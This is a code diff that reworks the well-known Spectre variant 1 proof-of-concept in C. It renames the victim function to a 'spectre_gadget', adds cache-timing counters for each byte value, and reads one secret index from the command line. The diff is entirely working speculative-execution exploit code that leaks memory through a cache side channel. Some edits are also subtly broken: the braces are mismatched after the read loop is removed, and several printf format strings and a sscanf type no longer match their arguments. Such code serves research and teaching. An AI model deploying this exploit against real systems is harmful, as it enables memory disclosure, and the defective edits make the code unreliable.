@@ -70,7 +70,7 @@ char * secret = "Spectre Exploit Done, Enable Mitigation!";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
-void victim_function(size_t x) {
+void spectre_gadget(size_t x) {
   if (x < array1_size) {
     temp &= array2[array1[x] * 512];
   }
@@ -82,7 +82,7 @@ Analysis code
 ********************************************************************/
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
+void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2], uint64_t counter[256]) {
   static int results[256];
   int tries, i, j, k, mix_i;
   unsigned int junk = 0;
@@ -113,7 +113,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       x = training_x ^ (x & (malicious_x ^ training_x));
 
       /* Call the victim! */
-      victim_function(x);
+      spectre_gadget(x);
 
     }
 
@@ -136,6 +136,8 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 
       if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
+      
+      counter[mix_i] += time2;
     }
 
     /* Locate highest & second-highest results results tallies in j/k */
@@ -172,90 +174,56 @@ int main(int argc,
 
   /* Default for malicious_x is the secret string address */
   size_t malicious_x = (size_t)(secret - (char * ) array1);
+  size_t idx = 0;
   
   /* Default addresses to read is 40 (which is the length of the secret string) */
   int len = 40;
   
   int score[2];
   uint8_t value[2];
+  uint64_t counter[256];
   int i;
 
   for (i = 0; i < (int)sizeof(array2); i++) {
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
   }
 
+  for (i = 0; i < 256; i++) {
+    counter[i] = 0;
+  }
+
   /* Parse the cache_hit_threshold from the first command line argument.
      (OPTIONAL) */
   if (argc >= 2) {
-    sscanf(argv[1], "%d", &cache_hit_threshold);
+    sscanf(argv[1], "%ld", &idx);
   }
-
-  /* Parse the malicious x address and length from the second and third
-     command line argument. (OPTIONAL) */
-  if (argc >= 4) {
-    sscanf(argv[2], "%p", (void * * )( &malicious_x));
-
-    /* Convert input value into a pointer */
-    malicious_x -= (size_t) array1;
-
-    sscanf(argv[3], "%d", &len);
-  }
-
-  /* Print git commit hash */
-  #ifdef GIT_COMMIT_HASH
-    printf("Version: commit " GIT_COMMIT_HASH "\n");
-  #endif
-  
-  /* Print cache hit threshold */
-  printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
-  
-  /* Print build configuration */
-  printf("Build: ");
-  #ifndef NORDTSCP
-    printf("RDTSCP_SUPPORTED ");
-  #else
-    printf("RDTSCP_NOT_SUPPORTED ");
-    printf("\nWill exit");
-    return (-1);
-  #endif
-  #ifndef NOMFENCE
-    printf("MFENCE_SUPPORTED ");
-  #else
-    printf("MFENCE_NOT_SUPPORTED ");
-    printf("\nWill exit");
-    return (-1);
-  #endif
-  #ifndef NOCLFLUSH
-    printf("CLFLUSH_SUPPORTED ");
-  #else
-    printf("CLFLUSH_NOT_SUPPORTED ");
-    printf("\nWill exit");
-    return (-1);
-  #endif
-
-  printf("\n");
-
-  printf("Reading %d bytes:\n", len);
+  malicious_x += idx;
 
   /* Start the read loop to read each address */
-  while (--len >= 0) {
-    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
-
+    printf("Target secret[%ld]...\n", idx);
+    printf("Real value : secret[%ld] == %c\n", idx, secret[idx]);
     /* Call readMemoryByte with the required cache hit threshold and
        malicious x address. value and score are arrays that are
        populated with the results.
     */
-    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
+    readMemoryByte(cache_hit_threshold, malicious_x, value, score, counter);
+
+    for (int i = 0; i < 256; i++) {
+      printf("array[%3.d * 512]: %4.lu / 999\n", i, counter[i]);
+    }
+    printf("\n");
+    printf("Target secret[%ld]...\n", idx);
+    printf("Real value : secret[%ld] == %c\n", idx, secret[idx]);
+    printf("\n");
 
     /* Display the results */
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-    printf("0x%02X=’%c’ score=%d ", value[0],
+    printf("0x%02X=’%c’(%d) score=%d ", value[0], value[0],
       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
     
     if (score[1] > 0) {
-      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
+      printf("(second best: 0x%02X=’%c’(%d) score=%d)", value[1], value[1],
       (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
-    }
 
     printf("\n");
   }
